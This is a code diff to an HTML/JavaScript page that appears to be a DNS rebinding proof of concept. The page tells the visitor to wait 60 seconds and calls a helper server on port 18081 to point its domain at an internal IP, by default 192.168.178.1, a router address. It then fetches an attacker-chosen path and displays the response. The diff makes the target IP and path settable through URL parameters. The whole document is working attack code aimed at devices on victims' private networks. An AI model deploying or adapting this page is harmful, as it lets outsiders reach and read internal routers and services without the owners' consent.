@@ -1,4 +1,13 @@
+<h1>Please wait 60 seconds.</h1>
 <script>
+  //getParameterByName from jolly.exe on stackoverflow
+  function getParameterByName(name) {
+    name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+    var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+        results = regex.exec(location.search);
+    return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+  }
+
   function cb(){
     var xhr =new XMLHttpRequest();
     xhr.onreadystatechange = function() {
@@ -6,11 +15,21 @@
           alert(xhr.responseText);
       }
     }
-    xhr.open("GET","/",false);
+    var path = getParameterByName('path');
+    if (path == "") {
+      path = '/'
+    }
+    xhr.open("GET",path,false);
     xhr.send();
   }
+
+  var ip = getParameterByName('ip');
+  if (ip == "") {
+    ip = '192.168.178.1'
+  }
+
   var xmlhttp = new XMLHttpRequest();
-  xmlhttp.open("GET","//" + document.domain + ":18081/add?ip=192.168.178.1&domain="+document.domain,true);
+  xmlhttp.open("GET","//" + document.domain + ":18081/add?ip="+ip+"&domain="+document.domain,true);
   xmlhttp.send();
   setTimeout(cb, 60000);
 </script>
